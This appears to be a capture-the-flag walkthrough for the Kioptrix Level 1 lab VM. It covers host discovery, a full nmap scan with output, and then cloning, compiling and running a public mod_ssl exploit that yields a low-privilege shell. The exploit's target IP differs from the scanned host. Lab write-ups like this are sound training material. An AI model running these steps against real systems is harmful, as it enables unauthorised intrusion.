## **Step 1: Reconnaissance**

Before attacking, we need to gather information about the target.

### **1.1 Network Discovery**

First, identify the IP address of the Kioptrix machine on the network:

bash

```bash
netdiscover -r 192.168.1.0/24
```

As i run the above command i finally get my Machine **IP**.

**==192.168.1.104   08:00:27:bf:5f:4b      1      42  PCS Systemtechnik GmbH==**

### **1.2 Port Scanning with Nmap**

Perform an Nmap scan to discover open ports and services:

```bash
nmap -v -sV -sC -O -T4 -p- -A -oA /home/arjun/"Nmap Output"/kioptrix-1 192.168.1.104
```

##### **OUTPUT:**

`PORT      STATE SERVICE     VERSION`
`22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)`
`|sshv1: Server supports SSHv1`
`| ssh-hostkey:` 
`|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)`
`|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)`
`|  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)`
`80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)`
`| http-methods:` 
`|   Supported Methods: GET HEAD OPTIONS TRACE`
`|_  Potentially risky methods: TRACE`
`|http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b`
`|_http-title: Test Page for the Apache Web Server on Red Hat Linux`
`111/tcp   open  rpcbind     2 (RPC #100000)`
`| rpcinfo:` 
`|   program version    port/proto  service`
`|   100000  2            111/tcp   rpcbind`
`|   100000  2            111/udp   rpcbind`
`|   100024  1          32768/tcp   status`
`|  100024  1          32768/udp   status`
`139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)`
`443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b`
`| http-methods:` 
`|_  Supported Methods: GET HEAD POST`
`|http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b`
`| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--`
`| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--`
`| Public Key type: rsa`
`| Public Key bits: 1024`
`| Signature Algorithm: md5WithRSAEncryption`
`| Not valid before: 2009-09-26T09:32:06`
`| Not valid after:  2010-09-26T09:32:06`
`| MD5:   78ce:5293:4723:e7fe:c28d:74ab:42d7:02f1`
`|_SHA-1: 9c42:91c3:bed2:a95b:983d:10ac:f766:ecb9:8766:1d33`
`| sslv2:` 
`|   SSLv2 supported`
`|   ciphers:` 
`|     SSL2_RC4_128_WITH_MD5`
`|     SSL2_RC2_128_CBC_WITH_MD5`
`|     SSL2_RC4_64_WITH_MD5`
`|     SSL2_DES_64_CBC_WITH_MD5`
`|     SSL2_DES_192_EDE3_CBC_WITH_MD5`
`|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5`
`|    SSL2_RC4_128_EXPORT40_WITH_MD5`
`|ssl-date: 2025-08-07T11:53:32+00:00; +3h59m58s from scanner time.`
`|_http-title: 400 Bad Request`
`32768/tcp open  status      1 (RPC #100024)`
`MAC Address: 08:00:27:BF:5F:4B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)`
`Device type: general purpose`
`Running: Linux 2.4.X`
`OS CPE: cpe:/o:linux:linux_kernel:2.4`
`OS details: Linux 2.4.9 - 2.4.18 (likely embedded)`
`Uptime guess: 0.001 days (since Thu Aug  7 13:22:22 2025)`
`Network Distance: 1 hop`
`TCP Sequence Prediction: Difficulty=201 (Good luck!)`
`IP ID Sequence Generation: All zeros`

`Host script results:`
`|clock-skew: 3h59m57s`
`|_smb2-time: Protocol negotiation failed (SMB2)`
`| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)`
`| Names:`
`|   KIOPTRIX<00>         Flags: <unique><active>`
`|   KIOPTRIX<03>         Flags: <unique><active>`
`|   KIOPTRIX<20>         Flags: <unique><active>`
`|   MYGROUP<00>          Flags: <group><active>`
`|_  MYGROUP<1e>          Flags: <group><active>`

`TRACEROUTE`
`HOP RTT     ADDRESS`
`1   0.79 ms 192.168.1.104`


## **Step 2: Exploitation**

Now, let's exploit This machine by using, Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4.

I have Download the exploit by the name OpenFuck from exploit-db data base.

1. Download OpenFuck.c

```bash
git clone https://github.com/heltonWernik/OpenFuck.git
```

2. Install ssl-dev library

```bash
apt-get install libssl-dev
```

3. It's Compile Time

```bash
gcc -o OpenFuck OpenFuck.c -lcrypto
```

4. Running the Exploit

```bash
./OpenFuck 0x6b 192.168.80.145 443 -c 40
```

5. Gets the lower privileged shell. (Screenshot)
![[Pasted image 20250812132512.png]]



